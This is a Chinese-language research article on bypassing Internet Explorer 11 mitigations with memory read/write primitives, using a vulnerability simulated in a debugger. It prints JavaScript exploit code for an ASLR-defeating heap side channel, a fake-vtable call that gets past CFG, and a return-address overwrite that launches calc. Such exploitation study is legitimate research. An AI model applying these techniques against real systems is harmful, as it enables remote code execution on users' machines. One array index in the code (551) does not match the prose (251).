> 原文链接: https://www.anquanke.com//post/id/89970 


# 借助读写原语绕过IE缓解技术


                                阅读量   
                                **80182**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01da262d02c6476357.png)](https://p0.ssl.qhimg.com/t01da262d02c6476357.png)

作者：dwfault@野火研习社

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

> 《IE浏览器缓解技术逆向初探》介绍了堆隔离、延迟释放、控制流保护等缓解技术，这些缓解技术使漏洞利用难度大大增加。内存破坏型漏洞转化成的内存读写能力在近年得到越来越多的重视，被总结为“R/W primitive”，国内一些研究者将其翻译为“读写原语”，也就是对内存的局部或全局读写能力。

## 一、读写原语

读写原语的获得过程取决于各个漏洞，获得读写原语之后往往封装一个Javascript函数，以供后续使用。形式可如下：

```
function rDword(address)`{`

…   //value = [address];

return value;

`}`

function wDword(address, value)`{`

…   //[address] = value;

`}`
```

使用读写原语时采用如下形式的函数调用，可对进程内存空间进行读、写操作：

```
var a = rDword(0x00401000);

wDword(0x102034a0, 0x123);
```



## 二、读写原语对缓解技术的威胁

### <a name="_Toc484251675"></a><a name="_Toc484099964"></a><a name="_Toc483230469"></a><a name="_Toc483230147"></a>2.1 对ASLR的威胁

在内存空间中，通过堆块中存储的少量信息可以找到对象虚表的位置，进而确定模块加载基址。加载模块的各节区均可被读出；攻击者也可编写Javascript代码解析PE文件获得更多关于模块加载的信息，以此绕过模块的随机化保护。其形式如下：

```
var vftable = rDword(0x102034a0);

var moduleAddress = vftable – offset;
```

### <a name="_Toc484251676"></a><a name="_Toc484099965"></a><a name="_Toc483230470"></a><a name="_Toc483230148"></a>2.2 对CFG的威胁

使用读写原语可以覆盖栈帧返回地址劫持程序流程，这种方法不受CFG技术的保护。其形式如下：

```
var returnAddress = findReturnAddress(moduleStart, moduleEnd, esp);

wDword(returnAddress, controlableCodeAddress);
```

使用读写原语也可以控制内存中的对象以劫持程序流程。首先伪造虚表，然后修改虚表指针指向伪造的虚表，修改伪造的虚表中的某虚函数指针，在索引虚函数时程序流程可被劫持。形式如下：

```
var fakeVftable = initFakeVftable(obj);

wDword(obj, fakeVftable);

obj.vfunc1(fakeParameter);
```

这种方法受CFG技术保护，但该缓解技术并非无法绕过。伪造的虚表中的特定虚函数可以被另一个可通过CFG检查的合法函数代替。有研究员提出类似ROP的攻击方法，理论上通过组合CFG gadget能够达到执行任意代码的效果。



## 三、模拟读写原语进行绕过尝试

新型缓解技术促使攻击者在漏洞利用时倾向获得读写原语，下面的过程借助调试器模拟漏洞以获得模拟的读写原语，通过Javascript代码在32 bit IE 11中绕过ASLR、延迟释放、控制流保护等全部缓解技术的保护，使用WinExec(“calc”)代表任意代码执行。

### <a name="_Toc484251678"></a><a name="_Toc484099967"></a><a name="_Toc483230472"></a><a name="_Toc483230150"></a>3.1 步骤一：模拟获得读写原语

通过调试器获得读写原语以进行后续工作。本步骤关注的核心对象是Int32Array，在代码中对应的符号为TypedArray&lt;int,0&gt;。通过逆向分析可知其大小为0x30字节，其结构如图1：

图1 Int32Array对象内存结构示意图

Int32Array是一个泛型对象，它提供对RawBuffer的视图，这个视图允许用户以32位有符号整型方式访问RawBuffer中存储的数据。借助调试获得读写原语所用代码如下：

```
arr1 = new Int32Array(0x400);

arr2 = new Int32Array(0x400);

alert("Pause the debugger to modify the pRawBuffer. The value should point to the 2nd TypedArray&lt;int,0&gt; object.\nSimulate a memory corruption vulnerability.");
```

调试时，在jscript9!Js::TypedArray&lt;int,0&gt;::TypedArray&lt;int,0&gt; +0x3b(不同版本函数偏移有所不同)下断点跟踪arr1和arr2对象的内存分配，当窗口弹出时暂停调试器，修改arr1对象的pRawBuffer域为arr2对象的地址，使得通过arr1对象可以修改arr2对象的内存空间。于是有：

```
function rDword(address)`{`

arr1[8] = address;

return arr2[0];

`}`

function wDword(address, value)`{`

arr1[8] = address;

arr2[0] = value;

`}`
```

读写原语使攻击者可以使用Javascript代码读写进程内存，通过Int32Array的虚表指针可计算出jscript9.dll的加载基地址以及其它很多信息。

### <a name="_Toc484251679"></a><a name="_Toc484099968"></a><a name="_Toc483230473"></a><a name="_Toc483230151"></a>3.2 步骤二：绕过地址空间布局随机化

在本步骤中，读写原语对ASLR的绕过扮演了次要角色；扮演主要角色的是MemoryProtection。在其他情况中，绕过ASLR的第一步通常是借助信息泄漏漏洞。

之前的文章提到，由于IE的保守垃圾回收算法，延迟释放技术可导致ASLR被绕过；通过调试也可观察到，在IE 11的某些版本中该保护是默认关闭的。为了展示MemoryProtection可被滥用以绕过ASLR，需要借助调试器将该缓解技术设置为开启状态。所用调试命令为(不同版本函数偏移有所不同)：

```
bp mshtml!MemoryProtection::InitializeProtectionFeature+0x7f "r eax=2"
```

#### 3.2.1 流程描述

本步骤主要参考自《Abusing Silent mitigations》【1】，大体流程是在高内存压力的情况下用Javascript操作堆内存，设法将一个模块加载到已知的内存地址。这里选择的模块是wmp.dll。其流程如下：

分配大量内存，只留下两个内存孔洞，A的大小与dll在内存中所占大小相同；B的大小在A的一倍到二倍之间；A和B不能连续。

为查询某地址X是否在A中，将其放置在栈上，然后有如下步骤：
1. 分配一个略大于A的内存块，该操作将内存块填入B中；
1. 释放步骤a中的内存块，B被加入MemoryProtection的等待列表；
1. 分配一个大小等于A的内存块，该操作将内存块填入A中；
1. 释放步骤c中的内存块，MemoryProtection会把B中的内存块释放并将B移出等待列表；A被加入MemoryProtection的等待列表；
1. 分配一个略大于A的内存块，该操作将内存块填入B中；
1. 释放步骤e中的内存块，MemoryProtection会检查对A中内存块的引用，此时只有X不指向A范围内的条件下，A中的内存块才被释放；B被加入MemoryProtection的等待列表；
1. 分配一个大小等于A的内存块，如果A中堆块未被释放，操作将失败，可以用Javascript捕获该异常；- 做清理工作，确保A、B被释放，以供下次尝试；
- 循环2~3步，直到A的起始地址被确定；
- 分配一个略大于A的内存块，该操作将内存块填入B中；
- 加载dll模块，它会被加载进入A中，模块加载地址被确定。
#### 3.2.2 技术细节

从技术实现角度上看，必须有相应“工具”才能完成上述流程。这些“工具”需要从逆向分析的过程中获得。实现上述流程需要具有的功能有：内存分配释放、清理等待列表、加载模块等。

内存分配和释放主要依靠三种方法。安全研究员通过调试发现，下述DOM操作相关的Javascript函数调用可用来分配内存【1】：

```
arr.push(document.createTextNode(string));

oDiv1.getElementsByClassName(string);

window.ref = oDiv1.getElementsByClassName(string);
```

第一种方法使用在内存准备阶段，通过这样的函数调用完成步骤1中的要求；第二种方法对应mshtml.dll中的CElement::Var_getElementsByClassName函数，可以用来申请内存空间，且由于没有存储函数返回值，该空间会直接被ProtectedFree释放；第三种方法存储函数的返回值，也就是保留了对其的引用，可用于把进程堆内存设置为确定的状态。结合使用三种方法可以满足整体流程对堆操作的要求。

代码中实现了myCollectGarbage函数来实施清空等待列表的操作，该函数充分利用MemoryProtection的特征来达到目的：

```
function myCollectGarbage() `{`

var i;

var j;

var ar;

for (j = 0; j &lt; 100; j++) `{`

CollectGarbage();

ar = [];

for (i = 0; i &lt; 1000; i++) `{`

ar.push(new Object());

`}`

ar = null;

CollectGarbage();

`}`

`}`
```

地址X的迭代过程需要调用testOneAddress函数：

```
testOneAddress = function(n) `{`

logMsg(0x100, "Starting testOneAddress");

try `{`

oDiv.getElementsByClassName(stringOfSizeA);

`}`catch (e) `{`

logMsg(0x102, "FAILURE: Unable to fill hole A (first fill).");

testResult = -1;

return;

`}`

oDiv.getElementsByClassName(stringSmall);

try `{`

oDiv.getElementsByClassName(stringOfSizeA);

`}`catch (e) `{`

logMsg(0x105, "Unable to fill hole A. Test result positive.");

testResult = 1;

return;

`}`

testResult = 0;

`}`;
```

函数利用Javascript引擎内存分配失败的异常实现侧信道攻击。前期准备时，进程内存空间几乎被堆空间填充满；前述的2-g步骤中尝试分配堆块，根据是否产生异常，可获知堆块分配成功还是失败；多次调用testOneAddress函数以迭代X值，通过侧信道攻击，将布尔型信息泄漏转换成整数型信息泄漏，也即获得wmp.dll的加载地址。

为了实现加载wmp.dll，有如下代码：

```
window.module1 = new ActiveXObject("WMPlayer.OCX.7");
```

获得wmp.dll加载的基地址之后，利用读写原语可以对wmp.dll进行读操作可获得大量信息。由于wmp.dll的导入表中一定包含kernel32.dll导出函数，本步骤可获得kernel32.dll模块中关键API如RtlCaptureContext、WinExec的加载地址。

### <a name="_Toc484251680"></a><a name="_Toc484099969"></a><a name="_Toc483230474"></a><a name="_Toc483230152"></a>3.3 步骤三：劫持程序流程

为了劫持程序执行流程，本步骤使用了两种覆写方式以完全绕过CFG技术的保护。第一次利用CFG保护的粗粒度的性质，覆写对象虚表指针，然后调用CFG判定为合法的函数RtlCaptureContext获得线程函数栈空间所在的位置；第二次利用CFG不保护栈空间的性质，在线程栈空间查找函数栈帧，覆写其中的返回地址以达到流程的完全劫持。

3.3.1 查找线程栈空间位置

调用Windows API RtlCaptureContext的代码如下：

```
function apiCallRtlCaptureContext(apiRtlCaptureContext, arr1,arr2,arr2backup)`{`

for(var i=0;i&lt;99;i++)`{`

var temp = rDword(arr2backup[0] + i*4);

arr2backupRestore(arr1, arr2backup);

arr2[i] = temp;

`}`

arr2[0x7c/4] = apiRtlCaptureContext;

arr1[0] = arr2backup[8];

var temp = arr2backup[8]+0x800;

temp in arr2;

arr2backupRestore(arr1, arr2backup);

return arr2[551];

`}`
```

该函数除了使用rDword函数等已封装的读写原语，还使用arr1、arr2进行了更复杂的内存读写操作。代码逻辑如下：
- 复制Int32Array函数的虚表到arr2的内存空间作为伪造的虚表；
- 将伪造的虚表中偏移0x7c的虚函数指针修改为API RtlCaptureContext的入口地址；
- 修改arr2对象的虚表指针，使其指向arr2内存空间中伪造的虚表；
- 赋值temp为arr2空间的后半部分的任一地址，作为RtlCaptureContext函数的参数；
- “temp in arr2″调用虚表偏移0x7c的虚函数Js::TypedArrayBase::HasItem【2】，但由于虚函数指针已被改写，实际调用的是RtlCaptureContext；
- 返回arr2[251]，该值由RtlCaptureContext写入，内容为函数入口时ESP寄存器的值。
函数返回获得的ESP寄存器的值可认为是某一时刻栈顶的值，增加一定偏移后可以寻址到其他函数的栈帧。

3.3.2 覆写返回地址

覆写返回地址的代码如下：

```
function apiCallExec(apiWinExec, esp)`{`

Math.atan(1);

ret = esp + 0x244;

divOutput3.innerText +="\n&gt; Overwrite return address "

+format(ret.toString(16), 8)+" : "+format(rDword(ret).toString(16),8)+".";

wDword(ret+0x14, 0);

wDword(ret+0x10, 0x636c6163);

wDword(ret+0x0c, 5);

wDword(ret+0x08, ret+0x10);

wDword(ret+0x04, 0xdeadbeaf);

wDword(ret+0x00, apiWinExec);

divOutput3.innerText += "\n&gt; Executing WinExec(\"calc\").";

alert("should have calc.exe.");

`}`
```

该函数将上一步骤获得的ESP寄存器的值加上适当偏移，使其恰好为某函数栈帧的返回地址。调试发现，偏移为0x244时可以覆写到适当的位置。在实际中也可以根据前一步骤得到的jscript9.dll代码段的范围进行搜索，来决定覆写的位置。最后，使用读写原语布置伪造的栈帧内容以劫持程序流程。如图2所示，模拟的攻击代码最终成功执行了WinExec(“calc”)<a name="_Toc483230475"></a><a name="_Toc483230153"></a>：

图2 成功执行Windows Calculator的截图

实验通过模拟的读写原语绕过了IE的缓解技术，具有代码执行能力。



## 四、参考资料

【1】Abusing Silent mitigations. Abdul-Aziz Hariri, Simon Zuckerbraum, Brian Gorenc

【2】https://improsec.com/blog/bypassing-control-flow-guard-in-windows-10
